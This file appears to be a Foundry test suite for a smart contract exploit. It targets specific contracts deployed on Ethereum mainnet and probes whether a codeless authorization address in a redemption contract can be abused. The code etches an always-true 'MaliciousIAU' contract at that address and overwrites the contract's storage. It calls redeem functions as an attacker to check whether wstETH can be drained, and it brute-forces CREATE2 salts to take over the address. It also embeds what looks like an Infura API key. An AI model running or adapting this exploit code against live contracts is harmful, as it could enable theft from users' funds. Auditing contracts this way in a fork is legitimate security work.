// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * IAU EMPTY ADDRESS EXPLOIT INVESTIGATION
 *
 * FINDING: RC slot 5 contains 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a
 * This address has NO CODE deployed!
 *
 * If RC relies on this address for authorization and we can deploy
 * malicious code there via CREATE2, we might bypass controls.
 */
contract IAUEmptyAddressExploit is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant IAU = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRCCode() public view {
        console.log("=== ANALYZE RC CODE FOR IAU USAGE ===\n");

        // Get RC bytecode
        bytes memory code = RC.code;
        console.log("RC code length:", code.length);

        // Look for IAU address in the bytecode
        // IAU = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a
        // In bytecode, addresses are often PUSH20 followed by the address

        // Search for the address bytes
        bytes20 iauBytes = bytes20(IAU);
        console.log("Searching for IAU address in RC code...");

        bool found = false;
        for (uint i = 0; i < code.length - 20; i++) {
            bool isMatch = true;
            for (uint j = 0; j < 20; j++) {
                if (code[i + j] != iauBytes[j]) {
                    isMatch = false;
                    break;
                }
            }
            if (isMatch) {
                console.log("Found IAU at bytecode offset:", i);
                found = true;
            }
        }

        if (!found) {
            console.log("IAU address NOT hardcoded - loaded from storage");
        }
    }

    function test_SimulateIAUDeployment() public {
        console.log("=== SIMULATE IAU DEPLOYMENT ===\n");

        // We can use vm.etch to deploy code at IAU address
        // This simulates what would happen if we could CREATE2 there

        console.log("IAU before:", IAU.code.length);

        // Deploy a malicious contract that always returns true
        bytes memory maliciousCode = hex"600160005260206000f3"; // PUSH1 01 PUSH1 00 MSTORE PUSH1 20 PUSH1 00 RETURN
        vm.etch(IAU, maliciousCode);

        console.log("IAU after:", IAU.code.length);

        // Now try RC operations
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Try RC.redeem(amount, to)
        console.log("\nTrying RC.redeem with malicious IAU...");
        (bool s1,) = RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));
        console.log("RC.redeem success:", s1);

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        vm.stopPrank();

        if (attackerBal > 0) {
            console.log("\n*** IAU DEPLOYMENT EXPLOIT WORKS! ***");
        }
    }

    function test_AnalyzeCREATE2Requirements() public view {
        console.log("=== CREATE2 REQUIREMENTS FOR IAU ===\n");

        // CREATE2 address = keccak256(0xff ++ deployer ++ salt ++ keccak256(initCode))[12:]
        // To deploy at IAU, we need to find deployer + salt + initCode combination

        console.log("Target address: 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a");

        // Check if any known factory could deploy there
        // Common factories:
        address[] memory factories = new address[](5);
        factories[0] = 0x4e59b44847b379578588920cA78FbF26c0B4956C; // CREATE2 deployer
        factories[1] = 0xce0042B868300000d44A59004Da54A005ffdcf9f; // Uniswap V3 factory
        factories[2] = 0x1F98431c8aD98523631AE4a59f267346ea31F984; // Uniswap V3 factory
        factories[3] = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // Uniswap V2 factory
        factories[4] = RC; // RC itself might be a factory

        console.log("\nKnown factories:");
        for (uint i = 0; i < factories.length; i++) {
            console.log("Factory %d:", i);
            console.logAddress(factories[i]);
            console.log("  Code size:", factories[i].code.length);
        }

        // The key question: who deployed IAU address, and can we redeploy there?
        // If the original deployer used CREATE2 and we know the init code pattern,
        // we might be able to predict or brute-force a deployment

        console.log("\nNote: To exploit this, attacker would need to:");
        console.log("1. Find the original CREATE2 deployer + salt");
        console.log("2. Deploy malicious code with same address derivation");
        console.log("3. OR find a factory that can deploy to arbitrary addresses");
    }

    function test_CallIAUDirectly() public {
        console.log("=== CALL IAU DIRECTLY ===\n");

        // Since IAU has no code, what happens when we call it?
        console.log("Calling empty IAU address...");

        // Try various calls
        (bool s1, bytes memory d1) = IAU.call("");
        console.log("Empty call success:", s1, "data length:", d1.length);

        (bool s2, bytes memory d2) = IAU.call(abi.encodeWithSignature("authorize()"));
        console.log("authorize() success:", s2, "data length:", d2.length);

        (bool s3, bytes memory d3) = IAU.staticcall(abi.encodeWithSignature("isAuthorized(address)", attacker));
        console.log("isAuthorized success:", s3, "data length:", d3.length);

        // Calls to empty addresses return success with empty data
        // This could be exploited if RC checks "success" without validating response
    }

    function test_ExploitEmptyAddressCallSuccess() public {
        console.log("=== EXPLOIT EMPTY ADDRESS CALL ===\n");

        // If RC does: (bool success,) = IAU.call(...) and only checks success
        // Then an empty address returns success=true with no data
        // This could bypass authorization!

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Try all possible RC functions
        console.log("Trying RC functions with empty IAU...");

        // redeem(uint256,address)
        (bool s1,) = RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));
        console.log("redeem(amount,to):", s1);

        // redeem(uint96)
        (bool s2,) = RC.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("redeem(amount):", s2);

        // finalizeRedeem(uint256)
        (bool s3,) = RC.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("finalizeRedeem:", s3);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DecodRCFunctions() public {
        console.log("=== DECODE RC FUNCTION SELECTORS ===\n");

        // Call RC with various selectors to understand its interface
        bytes4[] memory selectors = new bytes4[](20);
        selectors[0] = bytes4(keccak256("redeem(uint256,address)"));
        selectors[1] = bytes4(keccak256("redeem(uint96)"));
        selectors[2] = bytes4(keccak256("redeem(uint256)"));
        selectors[3] = bytes4(keccak256("finalizeRedeem(uint256)"));
        selectors[4] = bytes4(keccak256("cancelRedeem(uint256)"));
        selectors[5] = bytes4(keccak256("getRedeemLength(address)"));
        selectors[6] = bytes4(keccak256("owner()"));
        selectors[7] = bytes4(keccak256("admin()"));
        selectors[8] = bytes4(keccak256("setDelay(uint256)"));
        selectors[9] = bytes4(keccak256("delay()"));
        selectors[10] = bytes4(keccak256("pause()"));
        selectors[11] = bytes4(keccak256("unpause()"));
        selectors[12] = bytes4(keccak256("paused()"));
        selectors[13] = bytes4(keccak256("vault()"));
        selectors[14] = bytes4(keccak256("asset()"));
        selectors[15] = bytes4(keccak256("tAsset()"));
        selectors[16] = bytes4(keccak256("withdraw(uint256,address)"));
        selectors[17] = bytes4(keccak256("emergencyWithdraw(address)"));
        selectors[18] = bytes4(keccak256("rescue(address,address)"));
        selectors[19] = bytes4(keccak256("setIAU(address)"));

        string[20] memory names = [
            "redeem(uint256,address)",
            "redeem(uint96)",
            "redeem(uint256)",
            "finalizeRedeem(uint256)",
            "cancelRedeem(uint256)",
            "getRedeemLength(address)",
            "owner()",
            "admin()",
            "setDelay(uint256)",
            "delay()",
            "pause()",
            "unpause()",
            "paused()",
            "vault()",
            "asset()",
            "tAsset()",
            "withdraw(uint256,address)",
            "emergencyWithdraw(address)",
            "rescue(address,address)",
            "setIAU(address)"
        ];

        console.log("RC function responses:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool s, bytes memory d) = RC.staticcall(abi.encodeWithSelector(selectors[i]));
            if (s && d.length > 0) {
                console.log("%s: success, data len=%d", names[i], d.length);
            }
        }
    }

    function test_CheckRCStorageLayout() public {
        console.log("=== RC FULL STORAGE LAYOUT ===\n");

        console.log("RC address:", RC);

        // Check all storage slots
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(RC, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);

                // Try to decode
                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0 || addr == VAULT || addr == TASSET || addr == wstETH) {
                    console.log("  -> Address:", addr);
                }
            }
        }

        // Slot 0 = Timelock (0x2225DAbFfC7F862c99477381E971E8B1FDaB467e)
        // Slot 3 = 2 (some counter or state)
        // Slot 5 = IAU (0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a) - NO CODE
    }

    function test_IAUSlotModification() public {
        console.log("=== IAU SLOT MODIFICATION ===\n");

        // What if we could modify RC's slot 5 (IAU) to point to our contract?
        // This would require admin access... but let's test the outcome

        // Deploy malicious "IAU" that always authorizes
        MaliciousIAU malicious = new MaliciousIAU();
        console.log("Malicious IAU deployed at:", address(malicious));

        // Modify RC slot 5 to point to malicious
        vm.store(RC, bytes32(uint256(5)), bytes32(uint256(uint160(address(malicious)))));

        bytes32 newSlot5 = vm.load(RC, bytes32(uint256(5)));
        console.log("New RC slot 5:");
        console.logBytes32(newSlot5);

        // Now try RC.redeem
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        console.log("\nTrying RC.redeem with modified IAU slot...");
        (bool s1,) = RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker));
        console.log("RC.redeem success:", s1);

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH:", attackerBal / 1e18);

        vm.stopPrank();

        if (attackerBal > 0) {
            console.log("\n*** IAU SLOT MODIFICATION EXPLOIT WORKS! ***");
            console.log("Impact: If attacker can modify RC storage, immediate drain!");
        }
    }

    function test_FoundryCreate2() public {
        console.log("=== FOUNDRY CREATE2 TEST ===\n");

        // Test if we can compute what deployer+salt would create IAU address
        // CREATE2 address = keccak256(0xff ++ deployer ++ salt ++ keccak256(initCode))[12:]

        // Try common deployers
        address create2Deployer = 0x4e59b44847b379578588920cA78FbF26c0B4956C;
        console.log("Standard CREATE2 deployer:", create2Deployer);

        // Simple init code that does nothing
        bytes memory simpleInit = hex"6000";
        bytes32 initCodeHash = keccak256(simpleInit);

        // Brute force a few salts
        console.log("\nBrute forcing salts...");
        for (uint salt = 0; salt < 1000; salt++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff),
                create2Deployer,
                bytes32(salt),
                initCodeHash
            )))));

            if (predicted == IAU) {
                console.log("FOUND! Salt:", salt);
                console.log("Init code hash:");
                console.logBytes32(initCodeHash);
                break;
            }
        }

        console.log("No simple match found in first 1000 salts");
        console.log("Would need to reverse-engineer original deployment");
    }
}

contract MaliciousIAU {
    // Always return true for any call
    fallback() external {
        assembly {
            mstore(0, 1)
            return(0, 32)
        }
    }
}
